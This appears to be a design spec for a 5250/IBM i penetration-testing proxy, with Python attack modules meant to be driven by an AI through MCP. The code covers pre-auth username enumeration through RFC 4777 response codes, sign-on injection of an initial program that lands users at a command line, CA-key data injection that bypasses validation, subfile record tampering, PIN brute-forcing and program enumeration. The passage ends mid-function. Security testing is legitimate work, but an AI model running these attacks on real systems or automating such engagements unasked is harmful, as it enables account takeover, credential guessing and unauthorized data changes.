# hack5250 Phase 3 — 15 Enhancements

**Date:** 2026-04-08
**Scope:** hack5250 only. All 15 items from the research synthesis.
**Baseline:** `hack5250-pentest-complete` (`a0e28c3`), 153 tests.

---

## 1. Context

hack5250 is live-validated. The Mels Cargo pen test produced 5 findings (hidden admin function, database-persisted price tamper, supervisor PIN=1337, post-abend program invocation, hidden Purchaseable flag) and 6 bug fixes. This phase is what the live test revealed we *couldn't* do, plus protocol/RPG attack surface from research.

Three sources, all 2026-04-08:
- **Live test gaps** — what I drove manually
- **RFC 4777/4777bis protocol research** — unexploited 5250 features
- **RPG/DDS application research** — IBM i app-layer state-of-the-art

Deployment context: interactive operator + AI-driven via MCP. Priority is automation depth — the MCP should drive an entire engagement without operator key-presses.

---

## 2. Architecture

All 15 items land in `hack5250/hack5250/attacks/` as new modules + extensions. No `hackterm-core` changes. No `hack3270` changes.

```
hack5250/hack5250/
  attacks/
    escape.py            # exists — ATTN/SOH analysis
    preauth.py           # NEW — A1, A2, A3 (negotiation-layer)
    ca_key.py            # NEW — B1, B2, B3 (RPG-layer)
    differential.py      # NEW — C1, C2, C3 (cross-EXFMT analyzer)
    brute.py             # NEW — D1, D2 (auto brute)
    detector.py          # NEW — D3, E3 (CPF/MCH/STRPCCMD passive)
    surface.py           # NEW — D4 (tamper_map, hidden_content)
  tn5250.py              # MODIFIED — E1 (FCW strip in _mutate_sf), E2 (error suppress in mutate)
  libhack5250.py         # MODIFIED — wire all attacks into __init__, add API handlers
  gui.py                 # MODIFIED — new tabs/dock items
```

**Three independent workstreams** (can ship in any order):

| Stream | Items | Depends on |
|---|---|---|
| **Quick** (E1, E2, E3, D3, D4) | 5 trivial/low items, ~270 LOC | nothing |
| **Pre-auth** (A1, A2, A3) | 3 negotiation-layer items, ~160 LOC | nothing — pure `negotiate_hook` work |
| **RPG** (B1, B2, B3, C1, C2, C3, D1, D2) | 8 items, ~1,070 LOC | C1 diff engine is the foundation; B1-B3, C2-C3, D1-D2 build on it |

---

## 3. Tier A — Pre-Auth (negotiation layer)

### A1. `IBMSENDCONFREC` username enumeration oracle

**Module:** `attacks/preauth.py` — `ConfRecEnumerator` class

**Mechanic (RFC 4777 §10.4):** Set `IBMSENDCONFREC=YES` USERVAR. Host returns a Startup Response Record after auto-signon attempt. 4-byte EBCDIC code at offset 12-15:

| Code (EBCDIC) | Hex | Meaning |
|---|---|---|
| `0002` | `F0F0F0F2` | User profile not found — **does not exist** |
| `0003` | `F0F0F0F3` | User profile disabled — **exists, locked** |
| `0004` | `F0F0F0F4` | Invalid password — **exists, active** |
| `0006` | `F0F0F0F6` | Password expired — **exists, active, expired** |
| `0008` | `F0F0F0F8` | Next invalid will revoke — **exists, ONE TRY LEFT** |
| `0001` | `F0F0F0F1` | Success (we don't want this — use a garbage password) |

**Implementation:**

```python
# attacks/preauth.py
from hack5250.constants import (
    NE_USERVAR, NE_VALUE, USERVAR_USER, USERVAR_IBMSUBSPW,
    IAC, SB, SE, TELOPT_NEW_ENVIRON, NE_IS,
)

USERVAR_IBMSENDCONFREC = b"IBMSENDCONFREC"

# Startup Response Record markers (RFC 4777 §10.3)
# Record starts with x'001112A0' (length + record type)
# Code is 4 EBCDIC digits at a fixed offset within
CONFREC_CODES = {
    b"\xf0\xf0\xf0\xf2": ("not_found",   "User profile does not exist"),
    b"\xf0\xf0\xf0\xf3": ("disabled",    "User profile is disabled"),
    b"\xf0\xf0\xf0\xf4": ("bad_password","User exists, password wrong"),
    b"\xf0\xf0\xf0\xf6": ("expired",     "User exists, password expired"),
    b"\xf0\xf0\xf0\xf8": ("warn_revoke", "User exists, next failure revokes"),
    b"\xf0\xf0\xf0\xf1": ("success",     "Authenticated (unexpected — password was right)"),
}

class ConfRecEnumerator:
    """Pre-auth username enumeration via RFC 4777 §10.4 response codes.

    Workflow per probe:
      1. Open a fresh TCP connection to the IBM i (NOT through the proxy —
         this is reconnaissance, runs alongside the proxy session).
      2. Negotiate NEW-ENVIRON with USER=<probe>, IBMSUBSPW=<garbage>,
         IBMSENDCONFREC=YES.
      3. Read the Startup Response Record from the host.
      4. Extract the 4-byte code, classify.
      5. Close the connection.

    Rate-limited. Stops on warn_revoke (we don't want to lock anyone out
    by accident — though the whole point is the host TELLS us before that).
    """

    def __init__(self, host: str, port: int, garbage_password: str = "WRONGPW1"):
        self.host = host
        self.port = port
        self.garbage_password = garbage_password
        self.results: dict[str, tuple[str, str]] = {}  # user -> (code, desc)
        self.rate_limit_sec = 0.5

    def probe(self, username: str) -> tuple[str, str]:
        """Single probe. Returns (classification, description)."""
        # Build the NEW-ENVIRON IS subnegotiation
        env = (
            bytes([NE_USERVAR]) + USERVAR_USER +
            bytes([NE_VALUE]) + username.upper().encode("ascii") +
            bytes([NE_USERVAR]) + USERVAR_IBMSUBSPW +
            bytes([NE_VALUE]) + self.garbage_password.encode("ascii") +
            bytes([NE_USERVAR]) + USERVAR_IBMSENDCONFREC +
            bytes([NE_VALUE]) + b"YES"
        )
        # ... TCP connect, telnet handshake, send env, read confrec, classify
        # Returns CONFREC_CODES lookup result

    def enumerate(self, wordlist: list[str], stop_on_revoke_warn: bool = True):
        """Iterate wordlist. Populates self.results."""
        import time
        for user in wordlist:
            code, desc = self.probe(user)
            self.results[user] = (code, desc)
            if code == "warn_revoke" and stop_on_revoke_warn:
                # Don't probe this user again — host warned us
                pass
            time.sleep(self.rate_limit_sec)

    @property
    def existing_users(self) -> list[str]:
        return [u for u, (c, _) in self.results.items()
                if c not in ("not_found",)]
```

**Test approach:** Synthetic — build a fake telnet responder that returns hardcoded confrec codes. Verify each code maps to the right classification. Live-test against the IBM i target.

**MCP tool:** `enumerate_users(wordlist_name, max_probes=100) -> {user: classification}`

**LOC estimate:** 80

---

### A2. `IBMPROGRAM`/`IBMIMENU`/`IBMCURLIB` USERVAR injection

**Module:** `attacks/preauth.py` — extends `TN5250.negotiate_hook` via a new `NegotiateOpts` field

**Mechanic:** These USERVARs override the user profile's `INLPGM`/`INLMNU`/`CURLIB` at the Telnet server level. They're processed *before* QDSIGNON loads — display-file protection on the visible PROGRAM/MENU fields is irrelevant.

**Implementation:** Extend `negotiate_hook()` to inject these USERVARs into c2s NEW-ENVIRON traffic alongside the existing DEVNAME spoof. New `NegotiateOpts` field (or — since `NegotiateOpts` is in `hackterm-core` and we said no core changes — store on the `TN5250` instance directly):

```python
# tn5250.py — add to TN5250.__init__
self.inject_initial_program: str | None = None  # e.g. "QCMD"
self.inject_initial_menu: str | None = None
self.inject_current_library: str | None = None

# In negotiate_hook(), c2s direction, after DEVNAME splice:
USERVAR_IBMPROGRAM = b"IBMPROGRAM"
USERVAR_IBMIMENU = b"IBMIMENU"
USERVAR_IBMCURLIB = b"IBMCURLIB"

if direction == "c2s" and self.inject_initial_program:
    # Find the IAC SE terminator, insert our USERVAR before it
    se_pos = data.rfind(bytes([IAC, SE]))
    if se_pos != -1:
        injection = (
            bytes([NE_USERVAR]) + USERVAR_IBMPROGRAM +
            bytes([NE_VALUE]) + self.inject_initial_program.encode("ascii")
        )
        data = data[:se_pos] + injection + data[se_pos:]
# Similarly for menu/library
```

**The attack chain:** Operator connects emulator → proxy injects `IBMPROGRAM=QCMD` → operator types valid creds at sign-on → lands at CL command line instead of their menu. They never touched a protected field.

**API:** `set_initial_program(name)`, `set_initial_menu(name)`, `set_current_library(name)`

**LOC estimate:** 50

---

### A3. QDSIGNON SBA tampering

**Module:** `attacks/preauth.py` — `QDSignonTamperer` (thin wrapper, mostly constants)

**Mechanic:** QDSIGNON has a contractually fixed 178-byte buffer. IBM mandates: don't delete fields, don't change sequence, don't change lengths. Fields hidden via `DSPATR(ND)` still occupy their buffer positions:

| Field | Buffer offset | Length |
|---|---|---|
| USERID | 1 | 10 |
| PASSWRD | 11 | 10 |
| PROGRAM | 21 | 10 |
| MENU | 31 | 10 |
| CURLIB | 41 | 10 |
| UBUFFER | 51 | 128 |

Screen *positions* (row/col) vary by QDSIGNON variant, but the *buffer offsets* don't. The proxy needs to discover the screen positions once (parse the sign-on screen, find the input fields, map to buffer slots by order), then SBA-write to PROGRAM's screen position.

```python
# attacks/preauth.py
QDSIGNON_BUFFER_LAYOUT = [
    ("USERID",  10),
    ("PASSWRD", 10),
    ("PROGRAM", 10),
    ("MENU",    10),
    ("CURLIB",  10),
    ("UBUFFER", 128),
]

class QDSignonTamperer:
    """Map QDSIGNON screen positions to buffer slots.

    The buffer LAYOUT is fixed (IBM mandate). The screen POSITIONS vary
    by which QDSIGNON DDS variant the shop uses. Discover positions by
    parsing the sign-on screen — input fields appear in buffer order.
    """

    def __init__(self, signon_screen: Screen):
        # Input fields on QDSIGNON appear in buffer order. Map them.
        inputs = sorted(
            [f for f in signon_screen.fields if not f.protected],
            key=lambda f: (f.row, f.col),
        )
        self.field_positions: dict[str, tuple[int, int]] = {}
        for (name, _length), field in zip(QDSIGNON_BUFFER_LAYOUT, inputs):
            self.field_positions[name] = (field.row, field.col)

    def position_of(self, field_name: str) -> tuple[int, int] | None:
        """Where is PROGRAM on this sign-on variant? Even if it's NONDISP."""
        return self.field_positions.get(field_name)
```

**The attack:** `send_fields()` with USERID/PASSWRD at their positions PLUS PROGRAM=`QCMD` at *its* position. The operator's creds + our injected program. Same packet, same submit.

This is *redundant* with A2 (USERVAR injection bypasses it entirely) but tests a different code path: A2 tests the Telnet server, A3 tests QDSIGNON's display-file handling.

**LOC estimate:** 30

---

## 4. Tier B — RPG-layer attacks

### B1. CA-AID + field-data injection

**Module:** `attacks/ca_key.py` — `CAKeyInjector` class

**The deepest single attack in this spec.**

**Background:** DDS function keys come in two types:
- `CFnn` (Command Function) — transmits the input buffer, runs DDS validation (`VALUES`/`RANGE`/`COMP`/`CHECK`), turns on `*INKx`
- `CAnn` (Command Attention) — sends AID byte ONLY, no field data, no validation, turns on `*INKx`

The validation runs at the *workstation controller*. Real emulators strip field data when sending a CA key — they enforce the contract terminal-side. **The 5250 datastream itself doesn't enforce it.** A proxy can send `[cursor][CA-AID][SBA][data]...` — a packet shape no real emulator produces.

RPG programs that handle CA keys assume the buffer is unchanged. They check `*INKx`, branch on it, and *don't* re-validate fields they "know" couldn't have changed:

```rpg
EXFMT SCREEN1
SELECT
  WHEN *IN03                    // F3 = CA03 = "no data sent"
    LEAVE                       // exit without re-checking anything
  WHEN *IN12                    // F12 = CA12 = "cancel"
    RESET record                // ...but EXFMT already overwrote `record`
                                //    with whatever was in the inbound buffer
ENDSL
```

**Implementation:**

```python
# attacks/ca_key.py
from hack5250.constants import AID_TABLE
from hackterm_core import FieldWrite, Screen

class CAKeyInjector:
    """Send field data with a CA-key AID. Emulators can't do this.

    The 5250 datastream lets you put SBA+data with ANY AID byte. Only
    the emulator enforces "CA = no data". The proxy doesn't have to.

    RPG programs branching on *INKx for a CA key assume the input
    buffer is unchanged. EXFMT deposits whatever's there into program
    variables. They skip re-validation.
    """

    def __init__(self, protocol):
        self.protocol = protocol
        self.ca_keys: set[str] = set()   # discovered CA keys for current screen
        self.cf_keys: set[str] = set()

    def classify_keys_from_screen(self, screen: Screen) -> dict[str, str]:
        """Heuristic: which enabled keys are CA vs CF?

        SOH PF-mask tells us which keys are ENABLED. We can't directly
        see CA-vs-CF from the wire (it's a DDS keyword). Heuristics:
          - Keys advertised in screen text as "Cancel"/"Exit"/"Refresh"
            are usually CA (CA03=Exit, CA12=Cancel are conventions)
          - F1 (Help) is conventionally CA01
          - If a key appears in the SOH mask but the screen has no
            CHECK(ME) input fields, the validation distinction is moot

        Returns: {key_name: "CA"|"CF"|"unknown"}.
        """
        # F3, F12 default to CA by convention. Others unknown until tested.
        ...

    def send_ca_with_data(self, ca_aid: str, fields: list[tuple[int,int,str]],
                          cursor: tuple[int,int]) -> bytes:
        """The attack. Build a packet with the CA AID + field SBA pairs.

        This packet shape is impossible from a real emulator. The host's
        EXFMT will deposit the field data into program variables, then
        the program will branch on *INKx assuming the data is stale.
        """
        from hackterm_core import FieldWrite
        aid = self.protocol.aid_table[ca_aid]
        writes = [FieldWrite(row=r, col=c, data=self.protocol.codec.to_ebcdic(t))
                  for r, c, t in fields]
        return self.protocol.build_inbound(aid, cursor, writes)

    def probe_ca_validation_skip(self, daemon, ca_aid: str,
                                 invalid_value: str, target_field: tuple[int,int],
                                 timeout: float = 2.0) -> dict:
        """Send an INVALID value (one that fails DDS RANGE/VALUES) with
        a CA AID. If the program processes it without error → CA-skip
        confirmed. If we get a validation error → it was actually CF
        or the program re-validates."""
        ...
```

**Test approach:** Synthetic packet building (assert SBA pairs present with the CA AID byte). Live: Mels Cargo's F3 ("Quit") is almost certainly CA03 — send it with tampered Order=Y data, see if the order goes through.

**LOC estimate:** 150

---

### B2. RTNCSRLOC field-name spoofing

**Module:** `attacks/ca_key.py` — `CursorSpoof` helper (small)

**Mechanic:** `RTNCSRLOC(&RCD &FLD)` makes the workstation manager translate inbound cursor row/col → the DDS field name at that position → deposit into RPG variables. Programs branch on the field name. Move the inbound cursor to a different field's coords.

```python
# attacks/ca_key.py
def build_field_position_map(screen: Screen) -> dict[tuple[int,int], int]:
    """row,col -> field index. For finding 'which field is at this position'.

    RTNCSRLOC translates cursor coords to field name. We don't know the
    DDS names, but we can address fields by their positional index and
    let the operator label them after the fact.
    """
    return {(f.row, f.col): i for i, f in enumerate(screen.fields)}

def spoof_cursor_to_field(protocol, screen: Screen, target_field_idx: int,
                          aid: str = "ENTER") -> bytes:
    """Send AID with cursor at a SPECIFIC field's position — typically
    one that's protected or off-page. The workstation manager will
    report that field's name to the program."""
    target = screen.fields[target_field_idx]
    return protocol.build_inbound(
        protocol.aid_table[aid],
        cursor=(target.row, target.col),
        fields=[],  # AID-only, just the cursor lie
    )
```

**LOC estimate:** 60

---

### B3. Subfile RRN tampering

**Module:** `attacks/ca_key.py` — `SubfileRRNTamperer`

**Mechanic:** Subfile RRN (relative record number) travels as a hidden 4-digit zoned field. `READC` returns it; programs `UPDATE SFLREC` using the returned RRN. Tamper it → write into a different record. RRN=0 crashes `EXFMT`; RRN > loaded count may CHAIN-fail.

**Detection heuristic:** RRN is the hidden field whose content (a) is a 4-digit zoned number (`F0-F9` bytes), (b) increments by 1 when you ROLLUP, (c) is at the same row as the option-column input field.

```python
# attacks/ca_key.py
class SubfileRRNTamperer:
    def detect_rrn_field(self, screen_before_roll: Screen,
                         screen_after_roll: Screen) -> int | None:
        """Find the hidden field that incremented after ROLLUP.
        Returns field index or None if no candidate."""
        for i, (before, after) in enumerate(zip(
                screen_before_roll.fields, screen_after_roll.fields)):
            if not before.hidden:
                continue
            # 4-digit zoned: F0-F9 nibbles
            if len(before.content) != 4:
                continue
            if not all(0xF0 <= b <= 0xF9 for b in before.content):
                continue
            # Did it increment?
            try:
                val_before = int(bytes(before.content).decode('cp037'))
                val_after = int(bytes(after.content).decode('cp037'))
                if val_after > val_before:
                    return i
            except (ValueError, UnicodeDecodeError):
                continue
        return None

    def tamper_rrn(self, daemon, rrn_field: tuple[int,int],
                   option_field: tuple[int,int], option_value: str,
                   target_rrn: int) -> bytes:
        """Send option=X at the visible row + RRN=target_rrn at the hidden
        field. Host applies option X to record target_rrn instead of the
        record the operator sees.

        Special: target_rrn=0 → likely EXFMT crash (CPF5068 or similar).
        target_rrn > loaded → CHAIN fails, may abend or skip silently.
        """
        ...
```

**LOC estimate:** 50

---

## 5. Tier C — Cross-EXFMT Differential Analyzer

### C1. PUTOVR stale-field detector

**Module:** `attacks/differential.py` — `ExfmtDiffer` (foundation for C2, C3)

**Mechanic:** `PUTOVR`+`OVRDTA`+`OVRATR` only retransmit fields whose conditioning indicator is on. If RPG forgets `SETON`, the field is *absent* from the WTD — the workstation keeps the old value, and on the next read it comes back as if the user typed it. IBM explicitly warns this pattern is fragile.

**Wire signature:** Same record format header (the program ID at row 2 col 1 — `MCAD`, `MCOR`, etc.), but field at position (r,c) present in screen N and absent in screen N+1.

```python
# attacks/differential.py
from dataclasses import dataclass, field
from hackterm_core import Screen, Field

@dataclass
class FieldFingerprint:
    """Identity of a field across EXFMT cycles. Position-keyed."""
    row: int
    col: int
    length: int
    protected: bool
    hidden: bool

    @classmethod
    def from_field(cls, f: Field) -> "FieldFingerprint":
        return cls(f.row, f.col, f.length, f.protected, f.hidden)

    def __hash__(self):
        return hash((self.row, self.col, self.length))


@dataclass
class StaleField:
    """A field present in cycle N but absent in N+1. PUTOVR candidate."""
    fingerprint: FieldFingerprint
    last_seen_cycle: int
    last_content: bytes


class ExfmtDiffer:
    """Diff consecutive screens to find PUTOVR stale fields, indicator
    flips, hidden state echo-backs.

    Attaches as a daemon observer. Builds a per-format-header history.
    """

    def __init__(self, protocol):
        self.protocol = protocol
        self.history: list[Screen] = []
        self.format_header_pattern = None  # auto-detected from screen[1][0:8]
        self.stale_findings: list[StaleField] = []
        self.flip_findings: list[dict] = []  # C2

    def attach(self, daemon):
        daemon.add_observer(self._observe)

    def _observe(self, data: bytes, direction: str):
        if direction != "s2c":
            return
        screen = self.protocol.parse(data)
        if not self._same_format(screen):
            # Different program — reset
            self.history = [screen]
            return
        if self.history:
            self._diff(self.history[-1], screen)
        self.history.append(screen)
        if len(self.history) > 20:
            self.history.pop(0)

    def _same_format(self, screen: Screen) -> bool:
        """Heuristic: same program if row-2 header matches.
        Mels Cargo: 'MCAD', 'MCOR', 'MCMM' at r2c2."""
        if not self.history:
            return True
        prev_header = self.history[-1].rendered[1][:10]
        curr_header = screen.rendered[1][:10]
        return prev_header == curr_header

    def _diff(self, prev: Screen, curr: Screen):
        prev_fps = {FieldFingerprint.from_field(f) for f in prev.fields}
        curr_fps = {FieldFingerprint.from_field(f) for f in curr.fields}

        # Stale: in prev, not in curr — PUTOVR didn't retransmit
        for fp in prev_fps - curr_fps:
            # Find the actual field for content
            f = next(f for f in prev.fields
                     if (f.row, f.col, f.length) == (fp.row, fp.col, fp.length))
            self.stale_findings.append(StaleField(
                fingerprint=fp,
                last_seen_cycle=len(self.history),
                last_content=f.content,
            ))

        # Flip: same position, protected attribute changed (→ C2)
        for fp_prev in prev_fps & curr_fps:
            f_prev = next(f for f in prev.fields if (f.row, f.col) == (fp_prev.row, fp_prev.col))
            f_curr = next(f for f in curr.fields if (f.row, f.col) == (fp_prev.row, fp_prev.col))
            if f_prev.protected != f_curr.protected:
                self.flip_findings.append({
                    "position": (fp_prev.row, fp_prev.col),
                    "before": "protected" if f_prev.protected else "input",
                    "after": "protected" if f_curr.protected else "input",
                    "cycle": len(self.history),
                })
```

**LOC estimate:** 200

---

### C2. Indicator-conditioned protect-flip detector

**Module:** `attacks/differential.py` — built into `ExfmtDiffer._diff()` (above)

**Mechanic:** A field flipping protect→unprotect→protect across EXFMTs = indicator-driven `DSPATR(PR)`. The flip is the signature. Map which user input preceded the flip → that's the auth decision.

**Implementation:** Already in C1's `_diff()`. Adds a `flip_findings` list with the cycle number, so the operator can correlate "I typed X, then field Y unprotected."

**LOC estimate:** 30 (already mostly in C1)

---

### C3. Hidden-field state echo-back (RPG state fuzzer)

**Module:** `attacks/differential.py` — port `attacks/state_fuzz.py` from hack3270

**Mechanic:** Direct port. RPG programs stash state in hidden fields between EXFMTs (original keys, RRNs, auth flags). Find hidden fields whose content appeared in earlier user input → that's the echo-back. The longest-common-substring detector works unchanged.

**Implementation:** Copy `Step`/`Flow`/`EchoTarget` dataclasses, the SQLite `Flows`/`Steps` tables, the `analyze()` LCS detector, the `mutate_input()` mutations. Adapt:
- `_split_inbound()` for 5250 packet shape (cursor before AID, not after)
- Mutation `extra_sba` uses 5250's row/col addressing (1 byte each, not 3270's 12-bit)
- Result classification: `MCH1202`/`CPF*` instead of `DFHAC*`/`ASRA`

The architecture is identical. ~70% of the code copies directly.

**LOC estimate:** 250 (mostly port)

---

## 6. Tier D — Operational Automation

### D1. `brute_field()`

**Module:** `attacks/brute.py` — `FieldBruter` class

**Mechanic from live test:** Supervisor PIN at r18c23 len=4. Hardcoded 32 candidates, hit on `1337`. Real version:

```python
# attacks/brute.py
import hashlib
import time
import sqlite3
import itertools
from typing import Generator

CHARSETS = {
    "numeric":      "0123456789",                       # 10^N
    "upper":        "ABCDEFGHIJKLMNOPQRSTUVWXYZ",       # 26^N
    "alphanumeric": "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",  # 36^N
}

class FieldBruter:
    """Auto-brute against any input field. Response-diff stop condition.
    Resumable via SQLite. Rate-limited.

    Live-proven workflow (Mels Cargo, supervisor PIN):
      1. Capture the "wrong" response (try a known-bad value, hash screen)
      2. Iterate candidates: send_field → wait → hash response
      3. Stop when hash differs from the "wrong" baseline
    """

    def __init__(self, hack5250, db_conn: sqlite3.Connection):
        self.h = hack5250
        self.db = db_conn
        self._init_schema()

    def _init_schema(self):
        self.db.execute("""
            CREATE TABLE IF NOT EXISTS Brutes (
                id INTEGER PRIMARY KEY,
                row INT, col INT, length INT,
                charset TEXT, last_tried TEXT,
                hit TEXT, started REAL, completed REAL
            )
        """)

    def infer_charset(self, row: int, col: int) -> str:
        """Read FFW shift bits from last_screen. Numeric-only → 'numeric'."""
        if self.h.last_screen is None:
            return "alphanumeric"
        for f in self.h.last_screen.fields:
            if f.row == row and f.col == col:
                return "numeric" if f.numeric else "alphanumeric"
        return "alphanumeric"

    def _candidates(self, charset: str, length: int,
                    resume_from: str | None = None) -> Generator[str, None, None]:
        chars = CHARSETS[charset]
        for combo in itertools.product(chars, repeat=length):
            cand = "".join(combo)
            if resume_from and cand <= resume_from:
                continue
            yield cand

    def _screen_hash(self) -> str:
        screen = self.h.last_screen
        if screen is None:
            return ""
        return hashlib.sha256(screen.text.encode()).hexdigest()[:16]

    def brute(self, row: int, col: int, length: int,
              charset: str | None = None,
              wordlist: list[str] | None = None,
              rate_limit: float = 0.5,
              max_attempts: int | None = None) -> str | None:
        """Iterate. Returns the hit value or None.

        wordlist takes precedence over charset enumeration.
        Auto-resumes if a Brutes row exists for this position.
        """
        if charset is None:
            charset = self.infer_charset(row, col)

        # Establish baseline: send a known-wrong value, hash the response
        self.h.send_field(row, col, "@" * length)  # @ unlikely to be valid
        time.sleep(rate_limit)
        wrong_hash = self._screen_hash()

        # Resume?
        cur = self.db.execute(
            "SELECT last_tried FROM Brutes WHERE row=? AND col=? AND hit IS NULL",
            (row, col),
        )
        row_db = cur.fetchone()
        resume = row_db[0] if row_db else None

        cands = wordlist if wordlist else self._candidates(charset, length, resume)

        for n, cand in enumerate(cands):
            if max_attempts and n >= max_attempts:
                break
            self.h.send_field(row, col, cand)
            time.sleep(rate_limit)
            h = self._screen_hash()
            if h != wrong_hash:
                # HIT
                self.db.execute(
                    "UPDATE Brutes SET hit=?, completed=? WHERE row=? AND col=?",
                    (cand, time.time(), row, col),
                )
                self.db.commit()
                return cand
            # Checkpoint
            if n % 50 == 0:
                self.db.execute(
                    "INSERT OR REPLACE INTO Brutes (row, col, length, charset, last_tried) "
                    "VALUES (?, ?, ?, ?, ?)",
                    (row, col, length, charset, cand),
                )
                self.db.commit()
        return None
```

**LOC estimate:** 200

---

### D2. `enumerate_programs()`

**Module:** `attacks/brute.py` — `ProgramEnumerator` class

**Mechanic from live test:** Mels Cargo program names in row-2 headers: `MCMM`, `MCOR`, `MCAD`, `MCHS`. After APCT abend, typing the name at the blank screen restarted the transaction. The pattern is `<2-char-prefix><2-char-suffix>`. Brute the suffix.

```python
# attacks/brute.py
import re

class ProgramEnumerator:
    """Direct program-call brute. The IBM i transaction-enumeration equivalent.

    Live-proven (Mels Cargo): post-APCT, type MCMM at blank screen →
    transaction restarts. No re-auth. Program names visible at r2c2.
    """

    HEADER_PATTERN = re.compile(r'^\s*([A-Z]{2,8})\s')

    def __init__(self, hack5250):
        self.h = hack5250
        self.discovered: set[str] = set()
        self.callable: dict[str, str] = {}  # name -> screen title

    def harvest_from_history(self) -> set[str]:
        """Scan storage for program names in row-2 headers."""
        import sqlite3
        for row in self.h.storage.all_logs():
            if row[2] != "S":
                continue
            screen = self.h.protocol.parse(row[5])
            if len(screen.rendered) < 2:
                continue
            line2 = "".join(screen.rendered[1])
            m = self.HEADER_PATTERN.match(line2)
            if m:
                self.discovered.add(m.group(1))
        return self.discovered

    def infer_prefix(self) -> str | None:
        """Common prefix across discovered names. MCMM, MCOR, MCAD → 'MC'."""
        if len(self.discovered) < 2:
            return None
        names = sorted(self.discovered)
        for i in range(min(len(n) for n in names), 0, -1):
            prefix = names[0][:i]
            if all(n.startswith(prefix) for n in names):
                return prefix
        return None

    def enumerate(self, daemon, prefix: str | None = None,
                  suffix_charset: str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                  suffix_length: int = 2,
                  rate_limit: float = 0.5) -> dict[str, str]:
        """Try <prefix><AA>..<prefix><ZZ>. Classify each.

        Method: trigger an abend (or just CLEAR if blank-screen call works),
        type the candidate, see what comes back.
        """
        if prefix is None:
            prefix = self.infer_prefix()
            if prefix is None:
                raise ValueError("No prefix discovered — provide one")

        import itertools, time
        for combo in itertools.product(suffix_charset, repeat=suffix_length):
            candidate = prefix + "".join(combo)
            if candidate in self.discovered:
                continue
            # Get to blank/abend state, type candidate, classify
            self.h.send_aid("CLEAR")
            time.sleep(rate_limit)
            self.h.send_field(1, 1, candidate)
            time.sleep(rate_limit)
            screen = self.h.last_screen
            title = "".join(screen.rendered[1]).strip() if screen else ""
            if candidate in title:
                self.callable[candidate] = title
            elif "Abend" not in title and "not found" not in title.lower():
                # Something happened that's not a clear rejection
                self.callable[candidate] = f"? {title[:40]}"
        return self.callable
```

**LOC estimate:** 120

---

### D3. `MCH1202`/`CPF*` message harvester

**Module:** `attacks/detector.py` — `IBMiMessageDetector` (port of `ESMFingerprinter`)

**Pattern table:**

| Pattern | Finding key | Description |
|---|---|---|
| `\bMCH1202\b` | `decimal_data_error` | Numeric injection landed in packed/zoned field |
| `\bMCH3601\b` | `null_pointer` | Pointer not set — uninitialized state |
| `\bCPF1107\b` | `username_oracle` | "Password not correct" — userid exists |
| `\bCPF1120\b` | `username_oracle` | "User does not exist" — the other half |
| `\bCPF1394\b` | `account_state_leak` | "User profile cannot sign on" — disabled |
| `\bCPF2204\b` | `object_not_found` | Different from CPF1120 — auth-layer distinction |
| `\bCPD0078\b` | `dds_validation_fired` | DDS VALUES/RANGE rejected — host re-validates |
| `\bRNQ\d{4}\b` | `rpg_inquiry` | RPG inquiry message — unexpected condition, asking what to do |
| `\bRNX\d{4}\b` | `rpg_exception` | RPG exception — uncaught error |
| `Display Program Messages` | `stack_trace_leak` | The DSPMSG panel — has program/library/statement |

```python
# attacks/detector.py
import re
from hackterm_core import Screen

_RULES = [
    (re.compile(r'\bMCH1202\b'),  'decimal_data_error',
     'Decimal data error — packed/zoned field got non-numeric bytes'),
    (re.compile(r'\bMCH3601\b'),  'null_pointer',
     'Pointer not set — RPG used unset basing pointer'),
    (re.compile(r'\bCPF1107\b'),  'username_oracle',
     'Password not correct — USERID IS VALID (oracle)'),
    (re.compile(r'\bCPF1120\b'),  'username_oracle',
     'User does not exist (oracle — distinguishes from CPF1107)'),
    (re.compile(r'\bCPF1394\b'),  'account_state_leak',
     'User profile cannot sign on — disabled/restricted'),
    (re.compile(r'\bCPF2204\b'),  'object_not_found',
     'User profile not found at object level'),
    (re.compile(r'\bCPD0078\b'),  'dds_validation_fired',
     'DDS VALUES/RANGE/COMP rejected — host re-validates (good for them)'),
    (re.compile(r'\bRNQ\d{4}\b'), 'rpg_inquiry',
     'RPG inquiry message — program hit unexpected condition'),
    (re.compile(r'\bRNX\d{4}\b'), 'rpg_exception',
     'RPG exception — uncaught error in ILE program'),
    (re.compile(r'Display Program Messages'), 'stack_trace_leak',
     'DSPPGMMSG panel — leaks program/library/statement number'),
]

class IBMiMessageDetector:
    """Passive observer. Watches every screen for IBM i message IDs.
    Direct port of hack3270's ESMFingerprinter for the CPF/MCH/RNQ space."""

    def __init__(self, protocol):
        self.protocol = protocol
        self.findings: dict[str, list[str]] = {}  # key -> [matched_text, ...]

    def attach(self, daemon):
        daemon.add_observer(self._observe)

    def _observe(self, data: bytes, direction: str):
        if direction != "s2c":
            return
        screen = self.protocol.parse(data)
        text = screen.text
        for pattern, key, desc in _RULES:
            for match in pattern.finditer(text):
                self.findings.setdefault(key, []).append(match.group(0))
                # Special: stack_trace_leak — extract the program name
                if key == 'stack_trace_leak':
                    self._extract_stack_frame(text)

    def _extract_stack_frame(self, text: str):
        """DSPPGMMSG format includes 'Program . . . . :  PGMNAME'
        and 'Library . . . . :  LIBNAME'. Pull those."""
        prog = re.search(r'Program\s*\.+\s*:\s*(\w+)', text)
        lib = re.search(r'Library\s*\.+\s*:\s*(\w+)', text)
        if prog:
            self.findings.setdefault('leaked_programs', []).append(
                f"{lib.group(1) if lib else '?'}/{prog.group(1)}"
            )
```

**LOC estimate:** 120

---

### D4. `tamper_map()` + `get_hidden_content()`

**Module:** `attacks/surface.py` — pure analysis on `last_screen`

```python
# attacks/surface.py
from hackterm_core import Screen, EbcdicCodec

def get_hidden_content(screen: Screen, codec: EbcdicCodec) -> list[dict]:
    """Just the NONDISP fields, decoded. The data was always in
    screen.text — this surfaces it cleanly."""
    out = []
    for i, f in enumerate(screen.fields):
        if not f.hidden:
            continue
        out.append({
            "field_idx": i,
            "row": f.row, "col": f.col, "length": f.length,
            "ebcdic_hex": f.content.hex(),
            "text": codec.to_ascii(f.content),
        })
    return out


def tamper_map(screen: Screen, codec: EbcdicCodec) -> list[dict]:
    """All protected fields ranked by interestingness.

    Heuristics:
      HIGH:   contains digits → price/qty/code
              length 1-4 → flag/PIN/code
              hidden → suspicious by definition
      MEDIUM: length matches an input field → possible echo
      LOW:    all blanks
              length > 50 → decorative output
    """
    input_lengths = {f.length for f in screen.fields if not f.protected}

    ranked = []
